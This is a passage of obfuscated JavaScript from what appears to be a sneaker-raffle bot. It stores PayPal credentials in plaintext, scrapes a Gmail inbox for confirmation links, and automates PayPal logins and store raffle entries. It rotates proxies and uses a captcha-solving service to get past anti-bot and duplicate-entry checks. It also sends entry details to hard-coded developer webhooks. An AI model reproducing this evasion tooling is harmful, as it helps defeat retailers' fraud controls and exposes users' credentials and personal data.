        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x454479 = {}, _0x44fb83 = await _0x1bacab['get']('Email');
        _0x454479['Email'] = _0x44fb83['Email'];
        var _0x43e8b7 = Math['round'](Math['random']() * (_0x236d52['length'] - 0x1));
        _0x454479['Proxy'] = _0x236d52[_0x43e8b7], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x5aab7a = await _0x1bacab['get']('Password');
        return _0x454479['Password'] = _0x5aab7a['Password'], _0x768c3f['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x454479['Email'] + ',' + _0x454479['Password'] + ',' + _0x454479['Proxy']), _0x454479;
    }
    let _0x7080a5 = await _0x835893();
    var _0x45758a = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x2cdde9 = await _0x1bacab['get']('Amount'), _0x3e9329 = _0x2cdde9['Amount'];
    async function _0x1e7b49() {
        let _0x743b47 = 0x0;
        var _0x39a607 = new _0x54228e({
            'user': _0x4b1e6b['masterMail'],
            'password': _0x4b1e6b['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x420709(_0x85a0d3) {
            _0x39a607['openBox']('INBOX', ![], _0x85a0d3);
        }
        _0x39a607['once']('ready', function () {
            _0x420709(function (_0x2961ac, _0x159a19) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x2961ac)
                    throw _0x2961ac;
                _0x39a607['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x59f22c, _0x3791a7) {
                    if (!_0x3791a7 || !_0x3791a7['length'])
                        console['log'](_0x4786af() + '\x20[' + _0x4fe0e4 + ']\x20No\x20mails\x20found'), _0x39a607['end']();
                    else {
                        _0x3791a7 = _0x3791a7['slice'](0x0, _0x3e9329);
                        var _0x4dcb86 = _0x39a607['seq']['fetch'](_0x3791a7, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x4dcb86['on']('message', function (_0x2625bf, _0x54cdd9) {
                            var _0x4965c0 = '(#' + _0x54cdd9 + ')\x20';
                            _0x2625bf['on']('body', function (_0x367e14, _0x45dde5) {
                                _0x4a3e33(_0x367e14, (_0x4f481d, _0x3b4317) => {
                                    if (_0x3b4317['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x3b4317['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x3b4317['text']['split']('[')[0x2];
                                        var _0x46c666 = mes['split'](']')[0x0];
                                        _0x45758a['push'](_0x46c666);
                                    }
                                });
                            }), _0x2625bf['once']('end', function () {
                                _0x743b47++;
                            });
                        }), _0x4dcb86['once']('error', function (_0x5cf05f) {
                            console['log']('Fetch\x20error:\x20' + _0x5cf05f);
                        }), _0x4dcb86['once']('end', function () {
                            _0x39a607['end']();
                        });
                    }
                });
            });
        }), _0x39a607['once']('error', function (_0x3b0ef0) {
            console['log'](_0x4fb298['red'](_0x3b0ef0['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x39a607['once']('end', async function () {
        }), _0x39a607['connect']();
    }
    try {
        _0x1e7b49(), await _0x590479(0xfa0), console['log']('Found\x20' + _0x45758a['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x590479(0xfa0);
    }
    var _0x4e517d;
    _0x39f641('' + _0x4fe0e4);
    var _0xb89351 = _0x7080a5['Proxy']['split'](':'), _0x24a284;
    try {
        _0x24a284 = await _0x145da3['launch']({
            'userDataDir': 'sessions/' + _0x7080a5['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0xb89351[0x0] + ':' + _0xb89351[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x24a284 = await _0x145da3['launch']({
            'userDataDir': 'sessions/' + _0x7080a5['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0xb89351[0x0] + ':' + _0xb89351[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x4786af() + '\x20[' + _0x4fe0e4 + ']\x20Getting\x20Session');
        const _0x477ed3 = await _0x24a284['newPage']();
        await _0x477ed3['authenticate']({
            'username': '' + _0xb89351[0x2],
            'password': '' + _0xb89351[0x3]
        }), await _0x477ed3['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x477ed3['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x4786af() + '\x20[' + _0x4fe0e4 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x477ed3['waitForSelector']('#email');
            let _0x13d60a = await _0x477ed3['$eval']('#email', _0x68075d => _0x68075d['getAttribute']('value'));
            if (_0x13d60a == '') {
                await _0x477ed3['type']('#email', _0x7080a5['Email']), await _0x590479(0x1d3);
                let _0x1d209d = await _0x477ed3['$']('#splitPassword');
                _0x1d209d && (await _0x477ed3['click']('#btnNext'), await _0x590479(0xa28)), await _0x477ed3['type']('#password', _0x7080a5['Password']), await _0x590479(0x35c), await _0x477ed3['click']('#btnLogin');
            } else
                await _0x477ed3['type']('#password', _0x7080a5['Password']), await _0x590479(0x35c), await _0x477ed3['click']('#btnLogin');
            await _0x477ed3['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x4786af() + '\x20[' + _0x4fe0e4 + ']\x20Successfully\x20logged\x20in'), await _0x590479(0x2710);
        } catch (_0x424075) {
            throw new Error('Login\x20session\x20expired\x20' + _0x424075);
        }
        for (var _0x12d83a = 0x0; _0x12d83a < _0x45758a['length']; _0x12d83a++) {
            console['log'](_0x4786af() + '\x20[' + _0x4fe0e4 + ']\x20Task\x20' + (_0x12d83a + 0x1) + '\x20:\x20Starting\x20Verification'), _0x39f641(_0x4fe0e4 + '\x20Task\x20' + (_0x12d83a + 0x1) + '\x20/\x20' + _0x45758a['length']);
            const _0x5d8f7e = await _0x24a284['newPage']();
            await _0x5d8f7e['goto']('' + _0x45758a[_0x12d83a], { 'waitUntil': 'networkidle2' }), await _0x590479(0xbb8);
            try {
                const _0x390256 = await _0x5d8f7e['$']('#challenge-heading');
                _0x390256 && (console['log'](_0x4786af() + '\x20[' + _0x4fe0e4 + ']\x20Task\x20' + (_0x12d83a + 0x1) + '\x20:\x20' + _0x4fb298['yellow']('2FA\x20Required')), await _0x5d8f7e['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x590479(0x9c40), await _0x5d8f7e['waitForSelector']('#payment-submit-btn'), await _0x5d8f7e['$eval']('#payment-submit-btn', _0x148bc9 => _0x148bc9['click']()), await _0x5d8f7e['click']('#payment-submit-btn');
                try {
                    await _0x5d8f7e['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x590479(0x5dc), console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0x4fe0e4 + ']\x20Task\x20' + (_0x12d83a + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x94f16d) {
                    _0x3c74f5 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x94f16d['message']);
                } finally {
                    if (_0x3c74f5 == 'yes' && _0x23ac29 != 0x2) {
                        console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x4fe0e4['name'] + ']\x20Task\x20' + (_0x12d83a + 0x1) + '\x20:\x20Retrying\x20(' + _0x23ac29 + '\x20/\x205)')), _0x12d83a = _0x12d83a - 0x1, _0x23ac29 = _0x23ac29 + 0x1;
                        continue;
                    }
                    _0x3c74f5 == 'yes' && _0x23ac29 >= 0x2 && (_0x549c32(csv[_0x12d83a], _0x4fe0e4), _0x3c74f5 = 'no', _0x23ac29 = 0x0), await _0x5d8f7e['close'](), await _0x590479(0x4650);
                }
            } catch (_0x291bb2) {
                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x4fe0e4 + ']\x20Task\x20' + (_0x12d83a + 0x1) + '\x20:\x20' + _0x291bb2));
            }
        }
    } catch (_0xe91237) {
        console['log'](_0x4fb298['red']('' + _0xe91237));
    } finally {
        await _0x24a284['close']();
    }
}
const _0x514297 = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x224b96, _0x2d2f09, _0x24d65c) {
                    _0x145da3['use'](_0x109835()), _0x145da3['use'](_0x29f0f6({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4b1e6b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1df4a7 = 0x0; _0x1df4a7 < _0x2d2f09['length']; _0x1df4a7++) {
                        if (_0x12d194 != 'yes')
                            var _0x12d194 = '', _0x4eb6f4 = 0x0;
                        var _0xa9f5be;
                        try {
                            await _0x46b8ee(_0x2d2f09, _0x1df4a7);
                        } catch {
                            _0x12d194 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x39f641(_0x224b96['name'] + '\x20Task\x20' + (_0x1df4a7 + 0x1) + '\x20/\x20' + _0x2d2f09['length'] + '\x20||\x20File:\x20' + _0x4c637b + '\x20Proxies:\x20' + _0x1792f9);
                        var _0x1bc980 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x437825 = Math['round'](Math['random']() * (_0x1bc980['length'] - 0x1));
                        _0x2d2f09[_0x1df4a7]['Size'] == 'RANDOM' && (_0x2d2f09[_0x1df4a7]['Size'] = _0x1bc980[_0x437825]);
                        var _0x185b15 = Math['round'](Math['random']() * (_0x24d65c['length'] - 0x1)), _0x1721bc = _0x24d65c[_0x185b15]['split'](':'), _0x37dd35;
                        try {
                            _0x37dd35 = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1721bc[0x0] + ':' + _0x1721bc[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x37dd35 = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1721bc[0x0] + ':' + _0x1721bc[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x4786af() + '\x20[' + _0x224b96['name'] + ']\x20Task\x20' + (_0x1df4a7 + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x231b7f = await _0x37dd35['newPage']();
                            await _0x231b7f['authenticate']({
                                'username': '' + _0x1721bc[0x2],
                                'password': '' + _0x1721bc[0x3]
                            }), await _0x231b7f['setRequestInterception'](!![]), _0x231b7f['on']('request', _0x15cc03 => {
                                _0x15cc03['resourceType']() === 'image' || _0x15cc03['resourceType']() === 'font' || _0x15cc03['resourceType']() === 'media' ? _0x15cc03['abort']() : _0x15cc03['continue']();
                            }), await _0x231b7f['goto'](_0x2d2f09[_0x1df4a7]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x4786af() + '\x20[' + _0x224b96['name'] + ']\x20Task\x20' + (_0x1df4a7 + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x231b7f['waitForSelector']('#accept-all-gdpr'), await _0x231b7f['click']('#accept-all-gdpr'), await _0x231b7f['waitForSelector']('#raffles-product'), await _0x590479(0x3e8), await _0x231b7f['$eval']('#raffles-product', _0x56949c => _0x56949c['click']()), await _0x590479(0x1388), await _0x231b7f['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x1fb02e = await _0x231b7f['$']('.fancybox-inner\x20>\x20iframe'), _0x2fa9de = await _0x1fb02e['contentFrame']();
                            console['log'](_0x4786af() + '\x20[' + _0x224b96['name'] + ']\x20Task\x20' + (_0x1df4a7 + 0x1) + '\x20:\x20Checking\x20Information'), await _0x2fa9de['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x590479(0x1f4), await _0x2fa9de['type']('input[name=\x22sm-form-email\x22]', _0x2d2f09[_0x1df4a7]['Email']), await _0x590479(0xc8), await _0x2fa9de['type']('input[name=\x22sm-form-name\x22]', _0x2d2f09[_0x1df4a7]['FirstName'] + '\x20' + _0x2d2f09[_0x1df4a7]['LastName']), await _0x590479(0xc8), await _0x2fa9de['type']('input[name=\x22sm-form-street\x22]', _0x2d2f09[_0x1df4a7]['Address1'] + '\x20' + _0x2d2f09[_0x1df4a7]['HouseNumber'] + '\x20' + _0x2d2f09[_0x1df4a7]['Address2']), await _0x590479(0xc8), await _0x2fa9de['type']('input[name=\x22sm-form-city\x22]', _0x2d2f09[_0x1df4a7]['City']), await _0x590479(0xc8), await _0x2fa9de['type']('input[name=\x22sm-form-province\x22]', _0x2d2f09[_0x1df4a7]['State']), await _0x590479(0xc8), await _0x2fa9de['type']('input[name=\x22sm-form-zip\x22]', _0x2d2f09[_0x1df4a7]['Zip']), await _0x590479(0xc8), await _0x2fa9de['type']('input[name=\x22sm-form-country\x22]', _0x2d2f09[_0x1df4a7]['Country']), await _0x590479(0xc8), await _0x2fa9de['type']('input[name=\x22sm-form-phone\x22]', _0x2d2f09[_0x1df4a7]['Phone']), await _0x590479(0xc8), await _0x2fa9de['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x2d2f09[_0x1df4a7]['Follower']), await _0x590479(0xc8), await _0x2fa9de['type']('input[name=\x22sm-cst.size\x22]', _0x2d2f09[_0x1df4a7]['Size']), await _0x590479(0x1f4), await _0x2fa9de['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x590479(0x1f4), await _0x2fa9de['click']('.icheckbox_simple-custom'), await _0x590479(0x1f4), console['log'](_0x4786af() + '\x20[' + _0x224b96['name'] + ']\x20Task\x20' + (_0x1df4a7 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x2fa9de['$eval']('form', _0x5c9bb4 => _0x5c9bb4['submit']()), console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0x224b96['name'] + ']\x20Task\x20' + (_0x1df4a7 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x12d194 = '';
                            var _0x366e8c = await _0x54f36f(_0x2d2f09[_0x1df4a7], _0x224b96, 'dev', ![]), _0x3493f3 = await _0x54f36f(_0x2d2f09[_0x1df4a7], _0x224b96, 'pub', ![]);
                            const _0xae8197 = {
                                'succesDEVMSG': { 'embeds': [_0x366e8c] },
                                'succesPUBMSG': { 'embeds': [_0x3493f3] }
                            };
                            try {
                                _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0xae8197['succesDEVMSG']), await _0x590479(0xc8), await _0x1690f0(_0x4f7f5d, _0xae8197['succesDEVMSG']), await _0x590479(0xc8), await _0x1690f0(_0x4807c3, _0xae8197['succesPUBMSG']);
                            } catch (_0x7c701f) {
                                console['log'](_0x4fb298['yellow'](_0x4786af() + '\x20[' + _0x224b96['name'] + ']\x20Task\x20' + (_0x1df4a7 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x7c701f));
                            }
                        } catch (_0x43e1d1) {
                            console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x224b96['name'] + ']\x20Task\x20' + (_0x1df4a7 + 0x1) + '\x20:\x20' + _0x43e1d1)), _0xa9f5be = '' + _0x43e1d1;
                            var _0x1930cd = await _0x54f36f(_0x2d2f09[_0x1df4a7], _0x224b96, 'dev', !![], _0xa9f5be), _0x366e8c = await _0x54f36f(_0x2d2f09[_0x1df4a7], _0x224b96, 'dev', ![]), _0x3493f3 = await _0x54f36f(_0x2d2f09[_0x1df4a7], _0x224b96, 'pub', ![]);
                            const _0xa20c9 = {
                                'succesDEVMSG': { 'embeds': [_0x366e8c] },
                                'succesPUBMSG': { 'embeds': [_0x3493f3] }
                            };
                            _0xa20c9['errorDEV'] = { 'embeds': [_0x1930cd] }, _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0xa20c9['errorDEV']), await _0x1690f0(_0x874ee1, _0xa20c9['errorDEV']), _0x43e1d1 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x12d194 = 'yes');
                        } finally {
                            _0x37dd35['close']();
                            if (_0x12d194 == 'yes' && _0x4eb6f4 != 0x5 && _0xa9f5be != 'Size\x20Not\x20Found') {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x224b96['name'] + ']\x20Task\x20' + (_0x1df4a7 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4eb6f4 + '\x20/\x205)\x20')), _0x1df4a7 = _0x1df4a7 - 0x1, _0x4eb6f4 = _0x4eb6f4 + 0x1;
                                continue;
                            }
                            _0x12d194 == 'yes' && _0x4eb6f4 >= 0x5 && (_0x549c32(_0x2d2f09[_0x1df4a7], _0x224b96), _0x12d194 = 'no', _0x4eb6f4 = 0x0), console['log'](_0x4786af() + '\x20[' + _0x224b96['name'] + ']\x20Waiting\x20for\x20' + _0x4b1e6b['delay'] + '\x20ms'), await _0x590479(_0x4b1e6b['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x39d0a4, _0xf30e0d) {
                    var _0x2b4026 = [];
                    async function _0xefc454() {
                        var _0x21bb86 = new _0x54228e({
                            'user': _0x4b1e6b['masterMail'],
                            'password': _0x4b1e6b['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x588e28(_0x44445c) {
                            _0x21bb86['openBox']('INBOX', ![], _0x44445c);
                        }
                        _0x21bb86['once']('ready', function () {
                            _0x588e28(function (_0x140929, _0x1d7dc2) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x140929)
                                    throw _0x140929;
                                _0x21bb86['seq']['search'](['UNSEEN'], function (_0x30f046, _0x2313c3) {
                                    if (!_0x2313c3 || !_0x2313c3['length'])
                                        console['log'](_0x4786af() + '\x20[' + _0x39d0a4['name'] + ']\x20No\x20mails\x20found'), _0x21bb86['end']();
                                    else {
                                        var _0x2bd052 = _0x21bb86['seq']['fetch'](_0x2313c3, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x2bd052['on']('message', function (_0x588f6b, _0x204398) {
                                            var _0x2b9fc7 = '(#' + _0x204398 + ')\x20';
                                            _0x588f6b['on']('body', function (_0x501d8f, _0x41f150) {
                                                _0x4a3e33(_0x501d8f, (_0x334e5e, _0x4177ac) => {
                                                    if (_0x4177ac['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x4d658f = _0x4177ac['html']['split']('\x0a');
                                                        for (var _0x4e72c2 = 0x0; _0x4e72c2 < _0x4d658f['length']; _0x4e72c2++) {
                                                            if (_0x4d658f[_0x4e72c2]['includes']('salesmanago') && _0x4d658f[_0x4e72c2]['includes']('<td') && _0x4d658f[_0x4e72c2]['includes']('href')) {
                                                                var _0x19b41a = _0x4d658f[_0x4e72c2]['split']('href=\x22'), _0x31ac0c = _0x19b41a[0x1]['split']('\x22')[0x0];
                                                                _0x2b4026['push'](_0x31ac0c);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x588f6b['once']('end', function () {
                                            });
                                        }), _0x2bd052['once']('error', function (_0x21b7b2) {
                                            console['log']('Fetch\x20error:\x20' + _0x21b7b2);
                                        }), _0x2bd052['once']('end', function () {
                                            _0x21bb86['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x21bb86['once']('error', function (_0x5a4f7c) {
                            console['log'](_0x4fb298['red'](_0x5a4f7c['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x21bb86['once']('end', async function () {
                        }), _0x21bb86['connect']();
                    }
                    async function _0x579394(_0x47170e, _0x93da29, _0xfdad86) {
                        for (var _0x5d4078 = 0x0; _0x5d4078 < _0x93da29['length']; _0x5d4078++) {
                            async function _0x1fe601(_0x41cf9d, _0x5d5cda, _0xc37522, _0x76ba85, _0x39bab7) {
                                var _0xac92a6, _0x3a2b85 = {}, _0x3dd891 = [], _0x2faddf = {}, _0x3b0cdf = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x118ddb = Math['round'](Math['random']() * (_0x3b0cdf['length'] - 0x1));
                                _0x76ba85[_0x41cf9d]['Size'] == 'RANDOM' && (_0x76ba85[_0x41cf9d]['Size'] = _0x3b0cdf[_0x118ddb]);
                                !_0x76ba85 && (_0x76ba85 = {});
                                if (_0x4b1e6b['useRandomProxy'] = ![])
                                    var _0x467d9c = _0x39bab7[_0x41cf9d]['split'](':');
                                else
                                    var _0x1c31f1 = Math['round'](Math['random']() * (_0x39bab7['length'] - 0x1)), _0x467d9c = _0x39bab7[_0x1c31f1]['split'](':');
                                var _0x40ca9a = {
                                    'jar': _0x456e65,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0xc37522['url'],
                                    'headers': _0xc37522['headers'],
                                    'body': JSON['stringify'](_0x3a2b85),
                                    'proxy': 'http://' + _0x467d9c[0x2] + ':' + _0x467d9c[0x3] + '@' + _0x467d9c[0x0] + ':' + _0x467d9c[0x1]
                                };
                                return _0x5d5cda != 'ver' && (_0x40ca9a['url'] = _0xc37522['url'], _0x40ca9a['headers'] = _0xc37522['headers']), _0x5d5cda == 'ver' && (_0x40ca9a['method'] = 'GET', _0x40ca9a['url'] = _0x76ba85[_0x41cf9d]), new Promise(function (_0x40efc1, _0x542fc1) {
                                    callback = async (_0x4bec65, _0x3b267c, _0xd9afac) => {
                                        if (!_0x4bec65 && _0x3b267c['statusCode'] == 0xca || !_0x4bec65 && _0x3b267c['statusCode'] == 0xc8) {
                                            if (_0x5d5cda != 'ver') {
                                                var _0x5682c8 = await _0x54f36f(_0x76ba85[_0x41cf9d], _0xc37522, 'dev', ![]), _0xadb0ec = await _0x54f36f(_0x76ba85[_0x41cf9d], _0xc37522, 'pub', ![]);
                                                const _0xa57e12 = {
                                                    'succesDEVMSG': { 'embeds': [_0x5682c8] },
                                                    'succesPUBMSG': { 'embeds': [_0xadb0ec] }
                                                };
                                                if (_0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '')
                                                    try {
                                                        await _0x1690f0(_0x4b1e6b['webhook'], _0xa57e12['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x590479(0xc8), await _0x1690f0(_0x4f7f5d, _0xa57e12['succesDEVMSG']), await _0x590479(0xc8);
                                                try {
                                                    await _0x1690f0(_0x4807c3, _0xa57e12['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x491fd3(_0x76ba85[_0x41cf9d], _0xc37522);
                                            }
                                            _0x40efc1(console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0xc37522['name'] + ']\x20Task\x20' + (_0x41cf9d + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x5d5cda != 'ver') {
                                                var _0x3ab23f = '' + _0x4bec65, _0x2f2f1b = await _0x54f36f(_0x76ba85[_0x41cf9d], _0xc37522, 'dev', !![], _0x3ab23f), _0x229ec0 = {};
                                                _0x229ec0['errorDEV'] = { 'embeds': [_0x2f2f1b] }, _0x549c32(_0x76ba85[_0x41cf9d], _0xc37522), _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x229ec0['errorDEV']), await _0x1690f0(_0x874ee1, _0x229ec0['errorDEV']);
                                            }
                                            _0x542fc1(console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0xc37522['name'] + ']\x20Task\x20' + (_0x41cf9d + 0x1) + ':\x20' + _0x4bec65)));
                                        }
                                    };
                                    try {
                                        _0x5d5cda != 'ver' ? console['log'](_0x4786af() + '\x20[' + _0xc37522['name'] + ']\x20Task\x20' + (_0x41cf9d + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3a2b85['data']['attributes']['email']) : console['log'](_0x4786af() + '\x20[' + _0xc37522['name'] + ']\x20Task\x20' + (_0x41cf9d + 0x1) + ':\x20Fetching\x20Response'), _0x589558(_0x40ca9a, callback);
                                    } catch (_0x5dd5b9) {
                                        console['log'](_0x4786af() + '\x20Task\x20' + (_0x41cf9d + 0x1) + ':\x20' + _0x5dd5b9);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x1fe601(_0x5d4078, 'ver', _0x47170e, _0x93da29, _0xfdad86), console['log'](_0x4786af() + '\x20[' + _0x47170e['name'] + ']\x20Sleeping\x20for\x20' + _0x4b1e6b['delay'] + '\x20ms'), await _0x590479(_0x4b1e6b['delay']);
                            } catch (_0x2427b3) {
                            }
                        }
                    }
                    try {
                        _0xefc454(), await _0x590479(0xfa0), console['log']('Found\x20' + _0x2b4026['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x579394(_0x39d0a4, _0x2b4026, _0xf30e0d);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x494a18, _0x13f198, _0xcc6d7e) {
                for (var _0x35e415 = 0x0; _0x35e415 < _0x13f198['length']; _0x35e415++) {
                    _0x4b1e6b['AfewDelay'] = _0x4b1e6b['delay'];
                    var _0x30859d;
                    if (_0x44fb5e != 'yes')
                        var _0x44fb5e = '', _0x4d30ff = 0x0;
                    var _0x5c9c25 = _0x13f198[_0x35e415]['Url'], _0x39c722 = _0x13f198[_0x35e415];
                    _0x39f641(_0x494a18['name'] + '\x20Task\x20' + (_0x35e415 + 0x1) + '\x20/\x20' + _0x13f198['length'] + '\x20||\x20File:\x20' + _0x4c637b + '\x20Proxies:\x20' + _0x1792f9);
                    try {
                        await _0x46b8ee(_0x13f198, _0x35e415);
                    } catch {
                        _0x44fb5e = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x48f14f(_0x1a9d8b) {
                        const _0x29f45f = _0x768c3f['readFileSync']('../successful-tasks.csv', 'utf8'), _0x4d910f = _0x38692b['parse'](_0x29f45f, { 'header': !![] })['data'];
                        let _0x4a2fd7 = ![];
                        for (var _0x2f5a6c of _0x4d910f) {
                            if (_0x2f5a6c['Url'] == _0x1a9d8b['Url'] && _0x2f5a6c['Email'] == _0x1a9d8b['Email']) {
                                _0x4a2fd7 = !![];
                                break;
                            }
                        }
                        return _0x4a2fd7;
                    }
                    if (await _0x48f14f(_0x13f198[_0x35e415]) == !![]) {
                        console['log'](_0x4786af() + '\x20[' + _0x494a18['name'] + ']\x20Task\x20' + (_0x35e415 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x5500f6 = await _0x54f36f(_0x13f198[_0x35e415], _0x494a18, 'dev', ![]), _0x3c4d9a = await _0x54f36f(_0x13f198[_0x35e415], _0x494a18, 'pub', ![]);
                    const _0x3e21af = {
                        'succesDEVMSG': { 'embeds': [_0x5500f6] },
                        'succesPUBMSG': { 'embeds': [_0x3c4d9a] }
                    };
                    if (_0x13f198[_0x35e415]['Email'] == '' || _0x13f198[_0x35e415]['FirstName'] == '' || _0x13f198[_0x35e415]['LastName'] == '' || _0x13f198[_0x35e415]['Country'] == '' || _0x13f198[_0x35e415]['Size'] == '' || _0x13f198[_0x35e415]['Address1'] == '' || _0x13f198[_0x35e415]['Zip'] == '') {
                        console['log'](_0x4786af() + '\x20[' + _0x494a18['name'] + ']\x20Task\x20' + (_0x35e415 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x4b1e6b['useRandomProxy'] = ![])
                        var _0x144ddb = _0xcc6d7e[_0x35e415]['split'](':');
                    else
                        var _0x30a2cd = Math['round'](Math['random']() * (_0xcc6d7e['length'] - 0x1)), _0x144ddb = _0xcc6d7e[_0x30a2cd]['split'](':');
                    var _0x48de96;
                    try {
                        _0x48de96 = await _0x145da3['launch']({
